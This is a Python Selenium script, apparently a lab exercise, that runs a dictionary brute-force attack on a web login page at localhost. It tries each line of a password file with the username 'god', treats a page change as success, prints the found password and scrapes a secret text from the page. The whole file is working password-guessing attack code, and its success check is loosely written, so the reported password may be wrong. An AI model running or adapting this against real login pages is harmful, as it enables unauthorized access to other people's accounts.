import selenium
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


driver = webdriver.Chrome()
driver.get("http://localhost/w/login.html")

i = 1
log = "god"
file = open('secpas.txt', 'r')
pas = file.readline()
key = 0
#st = time.clock()
while pas:
    try:   
        login = driver.find_element_by_xpath("//input[@name='login']")
        login.send_keys(log)
        passw = driver.find_element_by_name("password")
        passw.send_keys(pas)
        prevpas=pas
        pas=file.readline()
        #if len(pas)>len(prevpas):
           #if len(prevpas)==1:
               # OneST=time.clock()
               # print(OneST)
            #if len(prevpas)==2:
                #TwoST=time.clock()
                #print(TwoST)
          #  if len(prevpas)==3:
                #ThreeST=time.clock()
                #print(ThreeST)
          #  if len(prevpas)==4:
              #  FourST=time.clock()
              #  print(FourST)
    except:        
        correctpas=pas
        pas=''
        key=1
        file.close()

secret=driver.find_element_by_tag_name("p").text
driver.find_element_by_link_text("Exit").click()
if key==1:
    print(secret)
    print("Correct password to log in:",correctpas)
else:
    print("Correct password not found")
